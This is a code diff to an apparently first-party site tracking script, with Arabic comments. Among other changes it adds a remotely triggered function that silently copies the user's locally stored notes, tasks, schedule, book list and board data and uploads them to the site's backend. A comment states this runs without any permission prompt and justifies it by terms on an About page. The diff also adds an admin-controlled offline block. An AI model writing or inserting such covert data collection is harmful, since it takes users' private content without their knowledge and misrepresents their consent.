@@ -114,6 +114,11 @@
 
   function act(name) { bump(pend.acts, name, 1); ev('act', name); }
   window.NXTrack = { act: act };
+  /* تُعرَّف مبكراً كي تُستدعى من applyState قبل اكتمال boot */
+  window.__NX_SET_OFFLINE_BLOCK = function (val) {
+    if (!('serviceWorker' in navigator) || !navigator.serviceWorker.controller) return;
+    navigator.serviceWorker.controller.postMessage({ type: 'SET_OFFLINE_BLOCK', value: val });
+  };
 
   /* ---------- جمع الاستخدام ---------- */
   function tick() {
@@ -281,6 +286,68 @@
     }).then(function () { busy = false; if (again) { again = false; setTimeout(function () { flush(false); }, 300); } });
   }
 
+  /* ---------- جلب بيانات الجهاز (يُرسل تلقائياً فور وصول الطلب، بدون أي نافذة إذن) ---------- */
+  /* المستخدم وافق على هذا بقبول شروط الاستخدام الظاهرة في صفحة «حول» */
+  function readSite() {
+    try { return JSON.parse(localStorage.getItem('novix.site.v1') || 'null') || {}; } catch (e) { return {}; }
+  }
+  function cap(v, n) { v = String(v == null ? '' : v); return v.length > n ? v.slice(0, n) : v; }
+  function idbGet(dbName, store, key) {
+    return new Promise(function (ok) {
+      var done = false;
+      function fin(v) { if (!done) { done = true; ok(v); } }
+      try {
+        var r = indexedDB.open(dbName);
+        r.onupgradeneeded = function () { try { r.transaction.abort(); } catch (e) {} fin(null); };
+        r.onsuccess = function () {
+          var db = r.result;
+          if (!db.objectStoreNames.contains(store)) { try { db.close(); } catch (e) {} return fin(null); }
+          try {
+            var q = db.transaction(store).objectStore(store).get(key);
+            q.onsuccess = function () { try { db.close(); } catch (e) {} fin(q.result == null ? null : q.result); };
+            q.onerror = function () { try { db.close(); } catch (e) {} fin(null); };
+          } catch (e) { fin(null); }
+        };
+        r.onerror = function () { fin(null); };
+        setTimeout(function () { fin(null); }, 4000);
+      } catch (e) { fin(null); }
+    });
+  }
+  var pulling = false;
+  function doPull(reqId) {
+    if (pulling) return; pulling = true;
+    var o = readSite();
+    var tasks = (o.tasks || []).slice(0, 300).map(function (x) {
+      return { t: cap(x.t, 200), p: cap(x.p, 10), d: x.d ? 1 : 0 };
+    });
+    var notes = (o.notes || []).slice(0, 200).map(function (x) {
+      return { title: cap(x.title, 100), body: cap(x.body, 1500), pin: x.pin ? 1 : 0, ts: +x.ts || 0 };
+    });
+    var sched = (o.tt || []).slice(0, 200).map(function (x) {
+      return { t: cap(x.t, 100), day: +x.day || 0, time: cap(x.time, 5) };
+    });
+    var books = (o.books || []).slice(0, 200).map(function (x) {
+      return { t: cap(x.t, 120), s: cap(x.s, 60), fn: cap(x.fn, 160), ty: cap(x.ty, 20), size: +x.size || 0 };
+    });
+    idbGet('novix-gn', 'kv', 'board').then(function (bd) {
+      var board = { pages: 0, items: 0 };
+      if (bd && bd.pages) {
+        board.pages = bd.pages.length;
+        board.items = (bd.items || []).reduce(function (a, pg) {
+          return a + (Array.isArray(pg) ? pg.length : 0);
+        }, 0);
+      }
+      return post(':commit', { writes: [{ update: {
+        name: DOC + '/visitors/' + did,
+        fields: fields({ pulled: { tasks: tasks, notes: notes, sched: sched, books: books, board: board }, pullId: String(reqId) })
+      }, updateMask: { fieldPaths: ['pulled', 'pullId'] },
+        updateTransforms: [{ fieldPath: 'pulledAt', setToServerValue: 'REQUEST_TIME' }]
+      }] });
+    }).then(function () {
+      ls('nx.pullack', String(reqId));
+    }).catch(function () {}).then(function () { pulling = false; });
+  }
+
   /* ---------- أوامر الأدمن ---------- */
   var AR = document.documentElement.lang === 'ar';
   var T = {
@@ -288,7 +355,8 @@
     maint: AR ? ['الموقع تحت الصيانة', 'نعمل على تحسينات، سنعود قريباً.'] : ['Under maintenance', 'We are making improvements. Back soon.'],
     msg: AR ? 'رسالة من الإدارة' : 'Message from the team',
     ok: AR ? 'حسناً' : 'OK',
-    wipe: AR ? ['إعادة ضبط بياناتك', 'قامت الإدارة بمسح بياناتك، وسيُعاد تحميل الموقع الآن.'] : ['Resetting your data', 'The team cleared your data. The site will reload now.']
+    wipe: AR ? ['إعادة ضبط بياناتك', 'قامت الإدارة بمسح بياناتك، وسيُعاد تحميل الموقع الآن.'] : ['Resetting your data', 'The team cleared your data. The site will reload now.'],
+    offline: AR ? ['تحتاج إلى اتصال بالإنترنت', 'هذا الموقع يعمل بالإنترنت فقط. تحقق من اتصالك وأعد المحاولة.'] : ['Internet connection required', 'This site requires an active internet connection. Please check your connection and try again.']
   };
   var CSSTXT = '.nxo{position:fixed;inset:0;z-index:2147483000;display:flex;align-items:center;justify-content:center;padding:24px;background:radial-gradient(circle at 30% 20%,#12332f,#0a1412 60%);color:#e8f4f1;font-family:system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;text-align:center}' +
     '.nxo div{max-width:420px}.nxo h2{margin:0 0 10px;font-size:26px;color:#5fe0c8}.nxo p{margin:0;line-height:1.8;color:#b9d0ca;white-space:pre-wrap}' +
@@ -355,6 +423,7 @@
     var ban = active(dev) ? dev : (active(ipb) ? ipb : null);
     if (dev && dev.wipeId && String(dev.wipeId) !== ls('nx.wiped')) { doWipe(String(dev.wipeId)); return; }
     if (dev && dev.assign && dev.assign.id && String(dev.assign.id) !== ls('nx.assign')) applyAssign(dev.assign);
+    if (dev && dev.pull && dev.pull.id && String(dev.pull.id) !== ls('nx.pullack')) doPull(dev.pull.id);
     whenUpd(function (u) { u.setLock(!!(dev && dev.updLock)); });
     if (dev && dev.forceUpd && dev.forceUpd.id && String(dev.forceUpd.id) !== ls('nx.forceupd')) {
       ls('nx.forceupd', String(dev.forceUpd.id)); whenUpd(function (u) { u.forceApply(); });
@@ -365,6 +434,16 @@
     stopped = !!(cfg.track === false || ban);
     if (ban) { overlay('nx-ban', T.banned[0], ban.reason || T.banned[1], false); return; }
     clearOverlay('nx-ban');
+    /* offlineBlock: إن فعّله الأدمن عالمياً أو لهذا الجهاز تحديداً، يُغلق الكاش فوراً وتظهر شاشة «تحتاج إنترنت» عند انقطاعه */
+    var obGlobal = !!(cfg.offlineBlock), obDev = !!(dev && dev.offlineBlock);
+    var offBlock = obGlobal || obDev;
+    if (window.__NX_SET_OFFLINE_BLOCK) window.__NX_SET_OFFLINE_BLOCK(offBlock);
+    if (offBlock && !navigator.onLine) {
+      overlay('nx-offline', T.offline[0], T.offline[1], false);
+      window.addEventListener('online', function () { clearOverlay('nx-offline'); location.reload(); }, { once: true });
+      return;
+    }
+    clearOverlay('nx-offline');
     if (cfg.maint) overlay('nx-maint', T.maint[0], cfg.maintMsg || T.maint[1], false); else clearOverlay('nx-maint');
     var bar = document.getElementById('nx-ann');
     if (cfg.annOn && cfg.annText) {
